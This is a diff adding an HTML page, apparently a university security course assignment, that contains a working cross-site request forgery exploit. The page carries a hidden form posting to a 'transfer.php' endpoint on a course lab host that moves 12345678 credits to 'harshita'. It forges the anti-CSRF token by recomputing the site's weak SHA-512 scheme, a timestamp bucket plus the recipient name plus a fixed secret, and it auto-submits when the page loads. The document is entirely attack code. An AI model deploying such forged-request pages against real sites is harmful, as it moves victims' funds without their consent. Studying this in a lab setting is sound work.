@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Problem 3</title>
+    <script src="sjcl.js"></script>
+    <script src="sha512.js"></script>
+    <script src="codecHex.js"></script>
+    <script src="codecString.js"></script>
+    <script src="bitArray.js"></script>
+</head>
+<body>
+    <h1>CSRF Exploit 2</h1>
+    <p>harshita grantbucks homepage Problem 3</p>
+
+    <!-- Crafted form to mimic the original form -->
+    <form id="exploitForm" action="http://cmsc232-113.c.cs.uchicago.edu/3/transfer.php" method="post">
+        
+        <input type="hidden" id="amount" name="amount" value="12345678">
+        <input type="hidden" id="recipient" name="recipient" value="harshita">
+        <input type="hidden" id="csrftoken" name="csrftoken" value="">
+    </form>
+
+    <script>
+
+        function computecsrf() {
+            var recipientname = "harshita";
+            var csrf_crafted = sjcl.codec.hex.fromBits(sjcl.hash.sha512.hash(String(Math.floor(Date.now() / 10000)) + recipientname + "goodenough"));
+            return csrf_crafted; 
+        }
+
+        
+        function submitCSRFAttack() {
+            var csrfToken = computecsrf();
+            document.getElementById('csrftoken').value = csrfToken;
+
+            
+            document.getElementById('exploitForm').submit();
+        }
+
+        
+        submitCSRFAttack();
+    </script>
+</body>
+</html>
